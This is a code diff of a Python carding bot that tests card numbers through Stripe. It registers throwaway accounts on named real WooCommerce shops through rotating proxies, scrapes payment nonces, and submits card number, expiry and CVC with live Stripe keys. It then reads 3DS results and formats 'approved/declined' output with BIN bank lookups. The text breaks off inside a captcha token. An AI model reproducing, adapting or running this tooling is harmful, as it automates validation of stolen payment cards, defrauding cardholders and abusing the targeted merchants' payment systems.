@@ -14,12 +14,12 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # Headers for Stripe request
 stripe_headers = {
     'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.6',
+    'accept-language': 'en-US,en;q=0.7',
     'content-type': 'application/x-www-form-urlencoded',
     'origin': 'https://js.stripe.com',
     'priority': 'u=1, i',
     'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Brave";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
@@ -90,386 +90,54 @@ def load_proxies():
         return proxies
     return []
 
-def get_bin_info_reliable(bin_number):
-    """FAST BUT RELIABLE BIN lookup using Binlist.net with optimized timeouts"""
-    if not bin_number or len(bin_number) < 6:
-        return get_fallback_bin_info(bin_number)
-    
-    max_retries = 2  # Reduced retries for speed
-    bin_code = bin_number[:6]
-    
-    print(f"🎯 FAST BIN lookup for {bin_code}...")
-    
-    for attempt in range(max_retries):
-        try:
-            print(f"🔍 BIN Attempt {attempt + 1}/{max_retries} using Binlist.net...")
-            
-            # Use ONLY Binlist.net API
-            api_url = f'https://lookup.binlist.net/{bin_code}'
-            
-            headers = {
-                'Accept': 'application/json',
-                'Accept-Version': '3',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-            }
-            
-            # OPTIMIZED: Faster timeouts
-            timeout_duration = 5.0 + (attempt * 2)  # Much shorter timeouts: 5s, 7s
-            
-            # Use direct connection for speed (no proxy for BIN)
-            print("🔄 Using DIRECT connection for fast BIN lookup")
-            
-            response = requests.get(api_url, headers=headers, timeout=timeout_duration, verify=False)
-            
-            if response.status_code == 200:
-                data = response.json()
-                print(f"📡 SUCCESS! Raw Binlist.net response: {data}")
-                
-                # PROPER PARSING for Binlist.net API response format
-                bin_info = {
-                    'bank': data.get('bank', {}).get('name', 'Unavailable'),
-                    'country': data.get('country', {}).get('name', 'Unknown'),
-                    'brand': data.get('scheme', 'Unknown').upper(),
-                    'type': data.get('type', 'Unknown').upper(),
-                    'level': 'UNKNOWN',
-                    'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
-                }
-                
-                # Fast cleaning
-                for key in ['bank', 'country', 'brand', 'type']:
-                    value = bin_info.get(key, '')
-                    if not value or value in ['', 'N/A', 'None', 'null', 'Unavailable', 'Unknown', 'NULL']:
-                        bin_info[key] = 'Unknown'
-                
-                # Quick type handling
-                if bin_info['type'] == 'DEBIT':
-                    bin_info['type'] = 'DEBIT'
-                elif bin_info['type'] == 'CREDIT':
-                    bin_info['type'] = 'CREDIT'
-                else:
-                    bin_info['type'] = 'CREDIT/DEBIT'
-                
-                # FAST LEVEL DETECTION
-                if bin_info['brand'] == 'VISA':
-                    if bin_number.startswith(('4', '43', '45')):
-                        bin_info['level'] = 'CLASSIC'
-                    elif bin_number.startswith(('46', '47', '48')):
-                        bin_info['level'] = 'GOLD'
-                    elif bin_number.startswith(('49')):
-                        bin_info['level'] = 'PLATINUM'
-                    else:
-                        bin_info['level'] = 'STANDARD'
-                elif bin_info['brand'] == 'MASTERCARD':
-                    bin_info['level'] = 'STANDARD'
-                else:
-                    bin_info['level'] = 'STANDARD'
-                
-                # QUICK VALIDATION
-                is_real_data = (
-                    bin_info['bank'] not in ['Unavailable', 'Unknown', 'VISA BANK', 'MASTERCARD BANK'] and 
-                    bin_info['brand'] != 'Unknown' and
-                    bin_info['country'] not in ['UNITED STATES', 'Unknown']
-                )
-                
-                if is_real_data:
-                    print(f"✅ REAL BIN CAPTURED: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}")
-                    print(f"✅ Bank: {bin_info.get('bank', 'UNKNOWN')} | Country: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}")
-                    return bin_info
-                else:
-                    # Even partial data is better than fallback
-                    if bin_info['brand'] != 'Unknown' and bin_info['country'] != 'Unknown':
-                        print(f"🟡 Using FAST BIN data: {bin_info['brand']} from {bin_info['country']}")
-                        return bin_info
-                    else:
-                        print(f"🔄 Data incomplete, quick retry...")
-                        
-            elif response.status_code == 429:
-                print("⚠️ Rate limit hit, quick retry...")
-                if attempt < max_retries - 1:
-                    time.sleep(1)  # Short wait for rate limits
-            elif response.status_code == 404:
-                print("⚠️ BIN not found in database")
-                break  # Don't retry for 404
-            else:
-                print(f"⚠️ API returned status {response.status_code}")
-            
-            # Quick retry with minimal delay
-            if attempt < max_retries - 1:
-                wait_time = (attempt + 1) * 1  # Very short delays: 1s, 2s
-                print(f"⏳ Quick wait {wait_time} seconds...")
-                time.sleep(wait_time)
-                
-        except requests.exceptions.Timeout:
-            print(f"⚠️ BIN lookup timed out (attempt {attempt + 1})")
-            if attempt < max_retries - 1:
-                time.sleep(1)
-        except requests.exceptions.ConnectionError:
-            print(f"⚠️ BIN connection error (attempt {attempt + 1})")
-            if attempt < max_retries - 1:
-                time.sleep(1)
-        except Exception as e:
-            print(f"⚠️ BIN lookup failed: {str(e)}")
-            if attempt < max_retries - 1:
-                time.sleep(1)
-    
-    # FAST FALLBACK: If quick retries fail, use enhanced fallback
-    print("🔄 Using enhanced fallback BIN info")
-    return get_enhanced_fallback_bin_info(bin_number)
-
-def get_enhanced_fallback_bin_info(bin_number):
-    """Enhanced fallback with better pattern recognition"""
-    if not bin_number or len(bin_number) < 6:
-        return get_fallback_bin_info(bin_number)
-    
-    # More sophisticated BIN pattern recognition
-    first_six = bin_number[:6]
-    
-    # VISA patterns
-    if bin_number.startswith('4'):
-        # More specific VISA patterns
-        if first_six.startswith(('4312', '4411', '4511')):  # Bank of America
-            bank = 'BANK OF AMERICA'
-            country = 'UNITED STATES'
-            emoji = '🇺🇸'
-        elif first_six.startswith(('4532', '4556', '4716')):  # Chase
-            bank = 'JPMORGAN CHASE BANK'
-            country = 'UNITED STATES' 
-            emoji = '🇺🇸'
-        elif first_six.startswith(('4024', '4175', '4408')):  # Wells Fargo
-            bank = 'WELLS FARGO BANK'
-            country = 'UNITED STATES'
-            emoji = '🇺🇸'
-        elif first_six.startswith(('4147', '4744')):  # Citi
-            bank = 'CITIBANK'
-            country = 'UNITED STATES'
-            emoji = '🇺🇸'
-        else:
-            bank = 'VISA BANK'
-            country = 'UNITED STATES'
-            emoji = '🇺🇸'
-        brand = 'VISA'
-        
-    # Mastercard patterns  
-    elif bin_number.startswith('5'):
-        if first_six.startswith(('5115', '5155', '5200')):  # Capital One
-            bank = 'CAPITAL ONE'
-            country = 'UNITED STATES'
-            emoji = '🇺🇸'
-        elif first_six.startswith(('5424', '5524')):  # US Bank
-            bank = 'U.S. BANK'
-            country = 'UNITED STATES'
-            emoji = '🇺🇸'
-        else:
-            bank = 'MASTERCARD BANK'
-            country = 'UNITED STATES'
-            emoji = '🇺🇸'
-        brand = 'MASTERCARD'
-        
-    # Other card types
-    elif bin_number.startswith('34') or bin_number.startswith('37'):
-        brand = 'AMEX'
-        bank = 'AMERICAN EXPRESS'
-        country = 'UNITED STATES'
-        emoji = '🇺🇸'
-    elif bin_number.startswith('6011') or bin_number.startswith('65'):
-        brand = 'DISCOVER'
-        bank = 'DISCOVER BANK'
-        country = 'UNITED STATES'
-        emoji = '🇺🇸'
-    elif bin_number.startswith('35'):
-        brand = 'JCB'
-        bank = 'JCB CO. LTD'
-        country = 'JAPAN'
-        emoji = '🇯🇵'
-    elif bin_number.startswith('62'):
-        brand = 'UNIONPAY'
-        bank = 'CHINA UNIONPAY'
-        country = 'CHINA'
-        emoji = '🇨🇳'
-    else:
-        brand = 'UNKNOWN'
-        bank = 'UNKNOWN BANK'
-        country = 'UNKNOWN'
-        emoji = '🏳️'
-    
-    # Determine card level based on patterns
-    if brand in ['VISA', 'MASTERCARD']:
-        if bin_number.startswith(('4', '5')) and len(bin_number) >= 4:
-            second_digit = bin_number[1] if len(bin_number) > 1 else '0'
-            if second_digit in ['5', '6', '7', '8', '9']:
-                level = 'PLATINUM'
-            elif second_digit in ['3', '4']:
-                level = 'GOLD'
-            else:
-                level = 'CLASSIC'
-        else:
-            level = 'STANDARD'
-    else:
-        level = 'STANDARD'
-    
-    # Determine type based on BIN patterns (simplified)
-    card_type = 'CREDIT/DEBIT'
-    if brand == 'AMEX':
-        card_type = 'CREDIT'
-    elif first_six.startswith(('4388', '4557')):  # Common debit prefixes
-        card_type = 'DEBIT'
-    
-    return {
-        'bank': bank,
-        'country': country,
-        'brand': brand,
-        'type': card_type,
-        'level': level,
-        'emoji': emoji
-    }
-
-def get_fallback_bin_info(bin_number):
-    """Basic fallback BIN info when everything fails"""
-    if not bin_number or len(bin_number) < 6:
-        return {
-            'bank': 'Unavailable',
-            'country': 'Unknown',
-            'brand': 'Unknown',
-            'type': 'Unknown',
-            'level': 'Unknown',
-            'emoji': '🏳️'
-        }
-    
-    # Basic pattern matching
-    if bin_number.startswith('4'):
-        brand = 'VISA'
-        bank = 'VISA BANK'
-        country = 'UNITED STATES'
-        emoji = '🇺🇸'
-    elif bin_number.startswith('5'):
-        brand = 'MASTERCARD'
-        bank = 'MASTERCARD BANK'
-        country = 'UNITED STATES'
-        emoji = '🇺🇸'
-    elif bin_number.startswith('34') or bin_number.startswith('37'):
-        brand = 'AMEX'
-        bank = 'AMERICAN EXPRESS'
-        country = 'UNITED STATES'
-        emoji = '🇺🇸'
-    elif bin_number.startswith('6'):
-        brand = 'DISCOVER'
-        bank = 'DISCOVER BANK'
-        country = 'UNITED STATES'
-        emoji = '🇺🇸'
-    elif bin_number.startswith('35'):
-        brand = 'JCB'
-        bank = 'JCB CO. LTD'
-        country = 'JAPAN'
-        emoji = '🇯🇵'
-    elif bin_number.startswith('62'):
-        brand = 'UNIONPAY'
-        bank = 'CHINA UNIONPAY'
-        country = 'CHINA'
-        emoji = '🇨🇳'
-    else:
-        brand = 'UNKNOWN'
-        bank = 'UNKNOWN BANK'
-        country = 'UNKNOWN'
-        emoji = '🏳️'
-    
-    return {
-        'bank': bank,
-        'country': country,
-        'brand': brand,
-        'type': 'CREDIT/DEBIT',
-        'level': 'STANDARD',
-        'emoji': emoji
-    }
-
-def get_country_emoji(country_code):
-    """Convert country code to emoji"""
-    if not country_code or len(country_code) != 2:
-        return '🏳️'
-    
+def create_new_account(session, proxy_str):
+    """Create a new account for each card with proxy"""
     try:
-        # Convert to uppercase and get emoji
-        country_code = country_code.upper()
-        return ''.join(chr(127397 + ord(char)) for char in country_code)
-    except:
-        return '🏳️'
+        proxies = parse_proxy(proxy_str)
+        
+        # Step 1: Get login nonce
+        login_page_res = session.get('https://firstcornershop.com/my-account/', proxies=proxies, timeout=30)
+        
+        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
+        if not login_nonce_match:
+            return False, "Failed to get login nonce"
+        login_nonce = login_nonce_match.group(1)
 
-def create_new_account_with_retry(session, proxy_str, max_retries=3):
-    """Create a new account for each card with proxy and retry logic"""
-    for attempt in range(max_retries):
-        try:
-            proxies = parse_proxy(proxy_str)
+        # Step 2: Register a new account with random email ONLY
+        random_email = generate_random_email()
+        
+        register_data = {
+            'email': random_email, 
+            'woocommerce-register-nonce': login_nonce,
+            '_wp_http_referer': '/my-account/', 
+            'register': 'Register',
+        }
+        
+        reg_response = session.post('https://firstcornershop.com/my-account/', data=register_data, proxies=proxies, timeout=30, allow_redirects=False)
+        
+        # Check if registration was successful
+        if reg_response.status_code in [302, 303]:
+            return True, "Account created"
+        else:
+            return True, "Account might be created"
             
-            # Step 1: Get login nonce
-            login_page_res = session.get('https://theherocollectibles.com/my-account/', proxies=proxies, timeout=15)
-            
-            login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
-            if not login_nonce_match:
-                if attempt < max_retries - 1:
-                    time.sleep(1)
-                    continue
-                return False, "Failed to get login nonce"
-            login_nonce = login_nonce_match.group(1)
+    except Exception as e:
+        return False, f"Account error: {str(e)}"
 
-            # Step 2: Register a new account with random email ONLY
-            random_email = generate_random_email()
-            
-            register_data = {
-                'email': random_email, 
-                'woocommerce-register-nonce': login_nonce,
-                '_wp_http_referer': '/my-account/', 
-                'register': 'Register',
-            }
-            
-            reg_response = session.post('https://theherocollectibles.com/my-account/', data=register_data, proxies=proxies, timeout=15, allow_redirects=False)
-            
-            # Check if registration was successful
-            if reg_response.status_code in [302, 303]:
-                return True, "Account created"
-            else:
-                return True, "Account might be created"
-                
-        except Exception as e:
-            if attempt < max_retries - 1:
-                print(f"Account creation attempt {attempt + 1} failed, retrying...")
-                time.sleep(1)
-                continue
-            return False, f"Account error: {str(e)}"
-
-def get_payment_nonce_with_retry(session, proxy_str, max_retries=3):
-    """Get payment nonce from the payment method page with proxy and retry logic"""
-    for attempt in range(max_retries):
-        try:
-            proxies = parse_proxy(proxy_str)
-            
-            payment_page_res = session.get('https://theherocollectibles.com/my-account/add-payment-method/', proxies=proxies, timeout=15)
-            payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
-            if not payment_nonce_match:
-                if attempt < max_retries - 1:
-                    time.sleep(1)
-                    continue
-                return None, "Failed to get payment nonce"
-            
-            ajax_nonce = payment_nonce_match.group(1)
-            return ajax_nonce, "Success"
-        except Exception as e:
-            if attempt < max_retries - 1:
-                print(f"Payment nonce attempt {attempt + 1} failed, retrying...")
-                time.sleep(1)
-                continue
-            return None, f"Payment nonce error: {str(e)}"
-
-def stripe_api_call_with_retry(url, headers, data, proxies, max_retries=3):
-    """Stripe API call with retry logic"""
-    for attempt in range(max_retries):
-        try:
-            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=15)
-            return response
-        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
-            if attempt < max_retries - 1:
-                print(f"Stripe API attempt {attempt + 1} failed, retrying...")
-                time.sleep(1)
-                continue
-            raise e
+def get_payment_nonce(session, proxy_str):
+    """Get payment nonce from the payment method page with proxy"""
+    try:
+        proxies = parse_proxy(proxy_str)
+        
+        payment_page_res = session.get('https://firstcornershop.com/my-account/add-payment-method/', proxies=proxies, timeout=30)
+        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
+        if not payment_nonce_match:
+            return None, "Failed to get payment nonce"
+        
+        ajax_nonce = payment_nonce_match.group(1)
+        return ajax_nonce, "Success"
+    except Exception as e:
+        return None, f"Payment nonce error: {str(e)}"
 
 def get_3ds_challenge_mandated(website_response, proxy_str):
     """Extract acsChallengeMandated value from 3DS authentication response"""
@@ -487,38 +155,47 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
             use_stripe_sdk = next_action.get('use_stripe_sdk', {})
             three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
             
-            print(f"DEBUG: Found 3DS source: {three_d_secure_2_source}")
+            print(f"DEBUG: Found 3DS source: {three_d_secure_2_source}")  # Debug line
             
             if three_d_secure_2_source:
                 proxies = parse_proxy(proxy_str)
                 headers = stripe_headers.copy()
                 headers['user-agent'] = get_rotating_user_agent()
                 
-                # Call 3DS authenticate endpoint
+                # Call 3DS authenticate endpoint - EXACT payload as in your capture
                 auth_data = {
                     'source': three_d_secure_2_source,
                     'browser': '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-GB","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-330","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}',
                     'one_click_authn_device_support[hosted]': 'false',
                     'one_click_authn_device_support[same_origin_frame]': 'false',
-                    'one_click_authn_device_support[spc_eligible]': 'true',
+                    'one_click_authn_device_support[spc_eligible]': 'true',  # Fixed this line
                     'one_click_authn_device_support[webauthn_eligible]': 'true',
                     'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
-                    'key': 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs',
+                    'key': 'pk_live_51BNw73H4BTbwSDwzFi2lqrLHFGR4NinUOc10n7csSG6wMZttO9YZCYmGRwqeHY8U27wJi1ucOx7uWWb3Juswn69l00HjGsBwaO',
                     '_stripe_version': '2024-06-20'
                 }
                 
-                auth_response = stripe_api_call_with_retry(
+                print(f"DEBUG: Making authenticate request...")  # Debug line
+                
+                auth_response = requests.post(
                     'https://api.stripe.com/v1/3ds2/authenticate',
-                    headers,
-                    auth_data,
-                    proxies
+                    headers=headers,
+                    data=auth_data,
+                    proxies=proxies,
+                    timeout=30
                 )
+                
+                print(f"DEBUG: Auth response status: {auth_response.status_code}")  # Debug line
+                print(f"DEBUG: Auth response text: {auth_response.text}")  # Debug line
                 
                 if auth_response.status_code == 200:
                     auth_data_response = auth_response.json()
                     ares = auth_data_response.get('ares', {})
                     acs_challenge = ares.get('acsChallengeMandated', 'N')
+                    print(f"DEBUG: Extracted ACS Challenge: {acs_challenge}")  # Debug line
                     return acs_challenge
+                else:
+                    print(f"DEBUG: Auth request failed! Status: {auth_response.status_code}")
         
         return 'N'
         
@@ -562,152 +239,255 @@ def get_final_message(website_response, proxy_str):
     except:
         return "Unknown response"
 
-def check_card_stripe(cc_line):
-    """Main function to check card via Stripe (single card) with retry logic"""
-    start_time = time.time()
-    max_retries = 2
+# BIN lookup function - UPDATED with reliable APIs
+def get_bin_info(bin_number):
+    """Get BIN information using reliable APIs without proxies"""
+    if not bin_number or len(bin_number) < 6:
+        return {
+            'bank': 'Unavailable',
+            'country': 'Unknown',
+            'brand': 'Unknown',
+            'type': 'Unknown',
+            'level': 'Unknown',
+            'emoji': '🏳️'
+        }
     
-    for retry_count in range(max_retries):
-        try:
-            # Parse CC
-            n, mm, yy, cvc = cc_line.strip().split('|')
-            if not yy.startswith('20'):
-                yy = '20' + yy
-            
-            # FAST BIN LOOKUP FIRST
-            print("🎯 FAST BIN lookup...")
-            bin_start_time = time.time()
-            bin_info = get_bin_info_reliable(n[:6])
-            bin_time = time.time() - bin_start_time
-            print(f"✅ BIN lookup completed in {bin_time:.2f} seconds")
-            
-            # Load proxies
-            proxies_list = load_proxies()
-            if not proxies_list:
-                elapsed_time = time.time() - start_time
-                return f"""
-DECLINED CC ❌
+    bin_code = bin_number[:6]
+    
+    try:
+        # Try multiple reliable BIN lookup APIs in sequence
+        apis = [
+            f"https://bin-ip-checker.p.rapidapi.com/?bin={bin_code}",
+            f"https://bins.antipublic.cc/bins/{bin_code}",
+            f"https://lookup.binlist.net/{bin_code}"
+        ]
+        
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
+        
+        bin_info = {}
+        
+        for api_url in apis:
+            try:
+                response = requests.get(api_url, headers=headers, timeout=10, verify=False)
+                
+                if response.status_code == 200:
+                    data = response.json()
+                    
+                    # Parse different API response formats
+                    if 'bin-ip-checker.p.rapidapi.com' in api_url:
+                        # RapidAPI format
+                        if data.get('success'):
+                            result = data.get('result', {})
+                            bin_info = {
+                                'bank': result.get('bank', {}).get('name', 'Unavailable'),
+                                'country': result.get('country', {}).get('name', 'Unknown'),
+                                'brand': result.get('scheme', 'Unknown'),
+                                'type': result.get('type', 'Unknown'),
+                                'level': result.get('level', 'Unknown'),
+                                'emoji': get_country_emoji(result.get('country', {}).get('code', ''))
+                            }
+                            break
+                    
+                    elif 'antipublic.cc' in api_url:
+                        # Antipublic format
+                        result = data.get('data', {})
+                        if result:
+                            bin_info = {
+                                'bank': result.get('bank', 'Unavailable'),
+                                'country': result.get('country', 'Unknown'),
+                                'brand': result.get('vendor', 'Unknown'),
+                                'type': result.get('type', 'Unknown'),
+                                'level': result.get('level', 'Unknown'),
+                                'emoji': get_country_emoji(result.get('country_code', ''))
+                            }
+                            break
+                    
+                    elif 'binlist.net' in api_url:
+                        # Binlist format
+                        if data:
+                            bin_info = {
+                                'bank': data.get('bank', {}).get('name', 'Unavailable'),
+                                'country': data.get('country', {}).get('name', 'Unknown'),
+                                'brand': data.get('scheme', 'Unknown'),
+                                'type': data.get('type', 'Unknown'),
+                                'level': data.get('brand', 'Unknown'),  # binlist doesn't have level
+                                'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
+                            }
+                            break
+                            
+            except Exception as e:
+                print(f"BIN API {api_url} failed: {str(e)}")
+                continue
+        
+        # If all APIs failed, return default values
+        if not bin_info:
+            bin_info = {
+                'bank': 'Unavailable',
+                'country': 'Unknown',
+                'brand': 'Unknown',
+                'type': 'Unknown',
+                'level': 'Unknown',
+                'emoji': '🏳️'
+            }
+        
+        # Clean up the values
+        for key in ['bank', 'country', 'brand', 'type', 'level']:
+            if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None']:
+                bin_info[key] = 'Unknown'
+        
+        return bin_info
+        
+    except Exception as e:
+        print(f"BIN lookup error: {str(e)}")
+        return {
+            'bank': 'Unavailable',
+            'country': 'Unknown',
+            'brand': 'Unknown',
+            'type': 'Unknown',
+            'level': 'Unknown',
+            'emoji': '🏳️'
+        }
 
-💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No proxies available
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
+def get_country_emoji(country_code):
+    """Convert country code to emoji"""
+    if not country_code or len(country_code) != 2:
+        return '🏳️'
+    
+    try:
+        # Convert to uppercase and get emoji
+        country_code = country_code.upper()
+        return ''.join(chr(127397 + ord(char)) for char in country_code)
+    except:
+        return '🏳️'
+        
+def check_card_stripe(cc_line):
+    """Main function to check card via Stripe (single card)"""
+    start_time = time.time()
+    
+    try:
+        # Parse CC
+        n, mm, yy, cvc = cc_line.strip().split('|')
+        if not yy.startswith('20'):
+            yy = '20' + yy
+        
+        # Load proxies
+        proxies_list = load_proxies()
+        if not proxies_list:
+            return "❌ No proxies available"
+        
+        # Use random proxy
+        proxy_str = random.choice(proxies_list)
+        
+        session = requests.Session()
+        session.headers.update({
+            'user-agent': get_rotating_user_agent()
+        })
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+        if len(yy) == 4:
+            yy_stripe = yy[-2:]
+        else:
+            yy_stripe = yy
 
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-
-            # Use random proxy
-            proxy_str = random.choice(proxies_list)
-            
-            session = requests.Session()
-            session.headers.update({
-                'user-agent': get_rotating_user_agent()
-            })
-
-            if len(yy) == 4:
-                yy_stripe = yy[-2:]
-            else:
-                yy_stripe = yy
-
-            # Create a NEW account for this card with retry
-            account_created, account_msg = create_new_account_with_retry(session, proxy_str, max_retries=2)
-            if not account_created:
-                if retry_count < max_retries - 1:
-                    print(f"Account creation failed, retry {retry_count + 1}/{max_retries}")
-                    time.sleep(1)
-                    continue
-                elapsed_time = time.time() - start_time
-                return f"""
+        # Create a NEW account for this card
+        account_created, account_msg = create_new_account(session, proxy_str)
+        if not account_created:
+            elapsed_time = time.time() - start_time
+            return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
+🏛️𝗕𝗮𝗻𝗸: UNKNOWN
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-            # First Request: Create Payment Method with Stripe
-            print("Step 1: Creating payment method with Stripe...")
-            
-            stripe_data = f'billing_details[name]=+&billing_details[email]={generate_random_email()}&billing_details[address][country]=ZW&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F5127fc55bb%3B+stripe-js-v3%2F5127fc55bb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftheherocollectibles.com&time_on_page=95388&client_attribution_metadata[client_session_id]=f7026e63-15a2-4f1a-801a-f2f492a6722b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=8095e952-f37d-44ac-a7cb-1ff5e4b3ab66&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=ed43bb8e-ae3d-4b29-ac98-92b821d69bc699cd18&muid=ebb7bf4e-b156-4cf6-b276-dcce5bb8bc530ef01f&sid=e824475c-373b-4745-a8fd-8824a98c5161ef1c98&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1LwpPBCLeHcAhGxV&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzMTkzNzc4LCJjZGF0YSI6Ii9aNGFiMHk2TG5meDZyZ2V2UHI1WEcyYWZ6ajdNMGc4NFRwblpQcE1BczAzU0RpTEROMk1vdlQxMHhpMFlRN1lwanlOTjdxcWQ1MXdiaytHOFJWRkNKOE0vMFZuZ0ZSem5kODdEQnVEWUowU1hraTZYaWQ3amc3bGJRQmM1aWZ4SnllMmxpZldjb25iVWJMbEVoRkIvYzRuRjNlbjF3K2FxVGlZeml5SGNldjFEaVhEaFpaSVVlekU0OVRyV3dOdFd0YklSV1V5VUdZZW54MDYiLCJwYXNza2V5IjoiSmVoSzBHVENSUzZPSUVQbUNyc3hZN2R1OVZDcDk0STQ2TXhNdUdHRHF0Y3NhL1BkRFExUmsxY3Y0WjRlaDRidklNWDJiY0dEU2RXTFcxTU9nYS8xSS9GVlJzYnByaEpERy83cTRPbDR1WlS4aHpXQmJIOHdlNlRKdS9oM3hsSTFYelNVNHE1eXR0ZGUvb1BWRlZpa0JuQjZwU2x5U2dUak8rOTkrV0NTMlB4K1lLYzBOdkVBVXRza2R2RkZ4RmV1aG9kTExHT0lzTjJDbnVrZjNrVm1UeEtjdU9jN3RUUy9jWDl4VDRLOVRyQjhXSmpPNmhFeWx1TWhaQWxGdmNwUFN4LzlDcWRuRkd5ODFsUzQ2RDJJQ0JLbEZ0NXhwY2pvcHhmWlQ1RHBrVDd3N3hxWHBZRU1jTDJqU1lzblRUcEYxc0w0U2pGc3V6blR4Y0NidnlaSWVma21yelN2TW1mUEQ4ZFBDQ1p1c1dDTzJqczZtMkC3MndsOWF6bnNnVlNDL3V3M3JTVFpWaXFHSWxlMlJVc04xbjdxZnh0TEpaK3EySGltVVYxZ3d6YnQzeXkwNCt1OXBoVWl3cE5VRU94amUvK2U0TS92M3N4Zk5DRnEvTzI1b0pMaVc3Y3FGbThVeXdzS0RNYVJQMFBYeW1nWGFBRE91TjVmdEVSOEdLQW5GY0RKd1l6eDBSaVZ3YzlqSzE0ZDJCbG1XcUhISDczcTlGa3h0bnc2TUFEN2JtVWxmOUhyVDFVMEhLQ0NlelhqUW9tU2FUdXVDNHNnRGhBK1pPU0gvNzJWRmlKbWZ3L2UyZUMyNFhVZlUrTmkvQ0xzQUtGOVA3Ui9pM2pHWU1nMm1EejRtb3oxRGhnaTlTWE5aSFJaQ0hCNUY3YlBsZks3WWgyanVsd0RiT0xZOWJIcS9uTXhsVW1iWnJ5UFVQUXUrT2N5WWtsV3h0R09jTVYrUnhHZ240SVNWanpEdVlEVzlFbzhnK3JwdUI0QlFFRFRDTFBKNC9mSDlxZEHqNGtrT21DSXZ3UktpdjZ2RjV5SjV5